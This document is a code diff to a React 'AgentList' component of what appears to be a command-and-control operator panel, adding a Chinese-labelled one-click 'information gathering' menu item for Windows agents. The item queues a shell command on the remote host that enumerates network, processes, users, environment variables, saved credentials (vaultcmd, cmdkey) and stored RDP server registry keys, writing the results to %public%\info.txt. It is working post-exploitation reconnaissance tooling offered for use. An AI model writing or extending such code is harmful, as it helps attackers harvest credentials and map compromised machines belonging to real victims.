@@ -145,6 +145,33 @@ export default function AgentList() {
                 },
               ],
             },
+            {
+              label: '信息收集',
+              icon: '\u{1F50D}',
+              onClick: () => {},
+              children: [
+                {
+                  label: 'Windows 基础全维度信息一键巡检',
+                  icon: '\u{1F4CB}',
+                  disabled: contextMenu.agent.os !== 'windows',
+                  onClick: async () => {
+                    const cmd = '(ipconfig /all && ipconfig /displaydns && netstat -ano && tasklist /v && systeminfo && whoami /all && arp -a && dir c:\\programdata && dir "c:\\Program Files (x86)" && dir "c:\\Program Files" && dir c:\\users && wmic volume list brief && route print && vaultcmd /list && cmdkey /list && set && reg query "HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default" && reg query "HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers") > %public%\\info.txt';
+                    try {
+                      await createTask(contextMenu.agent.id, {
+                        command: 'shell',
+                        arguments: cmd,
+                      });
+                      alert(`✓ Recon task queued, output: %public%\\info.txt`);
+                    } catch (err: unknown) {
+                      const msg =
+                        (err as { response?: { data?: { error?: { message?: string } } } })
+                          ?.response?.data?.error?.message;
+                      alert(`✗ Failed: ${msg || 'Could not create task'}`);
+                    }
+                  },
+                },
+              ],
+            },
           ]}
           onClose={() => setContextMenu(null)}
         />
